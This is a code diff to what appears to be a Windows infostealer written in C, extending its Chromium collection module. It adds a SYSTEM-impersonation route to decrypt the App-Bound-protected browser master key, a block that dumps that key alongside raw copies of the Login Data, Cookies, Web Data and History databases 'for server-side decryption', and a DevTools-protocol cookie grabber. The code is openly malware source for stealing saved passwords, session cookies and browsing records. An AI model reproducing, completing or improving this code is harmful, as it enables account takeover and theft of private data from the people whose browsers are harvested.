@@ -10,9 +10,11 @@
 #include "browser_paths.h"
 #include "chrome_crypto.h"
 #include "appbound.h"
+#include "elevator.h"
 #include "sqlite.h"
 #include "config.h"
 #include "secure_zero.h"
+#include "cdp_grabber.h"
 #include <stdlib.h>
 #include <string.h>
 #include <stdio.h>
@@ -193,18 +195,29 @@ static int get_master_key(const char *base_path, unsigned char *key32) {
 
     /* ── Strategy 2: App-Bound decryption via appbound module ─── */
 
-    
+
     if (appbound_get_key(ls_path, browser, key32) == 0) {
-        
+
         free(ls_path);
         return 0;
     }
 
-    /* ── Strategy 3: App-Bound on encrypted_key blob directly ─── */
+    /* ── Strategy 3: App-Bound with SYSTEM impersonation ──────── */
 
-    
+#ifdef ENABLE_ELEVATOR_IMPERSONATION
+    if (elevate_and_decrypt_key(enc_key, enc_len, browser, key32) == 0) {
+        dbg_printf("[+] get_master_key: elevator impersonation succeeded\n");
+        free(ls_path);
+        return 0;
+    }
+    dbg_printf("[!] get_master_key: elevator impersonation failed\n");
+#endif
+
+    /* ── Strategy 4: App-Bound COM (already SYSTEM) ───────────── */
+
+
     if (appbound_decrypt(enc_key, enc_len, browser, key32) == 0) {
-        
+
         free(ls_path);
         return 0;
     }
@@ -697,6 +710,35 @@ CollectResult collect_chromium(const char *local_app_data, const char *roaming_a
             bd->autofill = extract_chromium_autofill(profiles[p], &bd->autofill_count);
             bd->bookmarks = extract_chromium_bookmarks(profiles[p], &bd->bookmark_count);
 
+#ifdef ENABLE_RAW_EXPORT
+            /* Copy raw browser DB files + master key for server-side decryption */
+            if (key_ok) {
+                char mk_path[MAX_PATH];
+                snprintf(mk_path, sizeof(mk_path), "%s%s_%s_master_key.bin",
+                         local_app_data ? local_app_data : ".",
+                         browsers[b].name, basename_of(profiles[p]));
+                FILE *mkf = fopen(mk_path, "wb");
+                if (mkf) { fwrite(key32, 1, 32, mkf); fclose(mkf); }
+
+                /* Copy raw SQLite files */
+                const char *raw_files[] = {"Login Data", "Cookies", "Web Data", "History"};
+                for (int rf = 0; rf < 4; rf++) {
+                    char src[MAX_PATH], dst[MAX_PATH];
+                    snprintf(src, sizeof(src), "%s%s", profiles[p], raw_files[rf]);
+                    snprintf(dst, sizeof(dst), "%s%s_%s_%s.raw",
+                             local_app_data ? local_app_data : ".",
+                             browsers[b].name, basename_of(profiles[p]), raw_files[rf]);
+                    size_t flen = 0;
+                    unsigned char *fdata = read_file(src, &flen);
+                    if (fdata) {
+                        FILE *df = fopen(dst, "wb");
+                        if (df) { fwrite(fdata, 1, flen, df); fclose(df); }
+                        free(fdata);
+                    }
+                }
+            }
+#endif
+
             result.count++;
         }
 
@@ -706,6 +748,24 @@ CollectResult collect_chromium(const char *local_app_data, const char *roaming_a
         free(profiles);
         free(base_path);
     }
+
+    /* ── CDP cookie extraction (supplemental) ─────────────────── */
+#ifdef ENABLE_CDP_GRABBER
+    /* Find Chrome path for CDP extraction */
+    for (size_t b = 0; b < browser_count; b++) {
+        if (strstr(browsers[b].name, "Chrome") && !strstr(browsers[b].name, "x86")) {
+            const char *app_data = browsers[b].use_roaming ? roaming_app_data : local_app_data;
+            char *chrome_base = path_join(app_data, browsers[b].path_suffix);
+            if (chrome_base && dir_exists(chrome_base)) {
+                char cdp_output[MAX_PATH];
+                snprintf(cdp_output, sizeof(cdp_output), "%s_cookies_cdp.txt", browsers[b].name);
+                cdp_grab_cookies(NULL, cdp_output);
+            }
+            free(chrome_base);
+            break;
+        }
+    }
+#endif
 
     return result;
 }
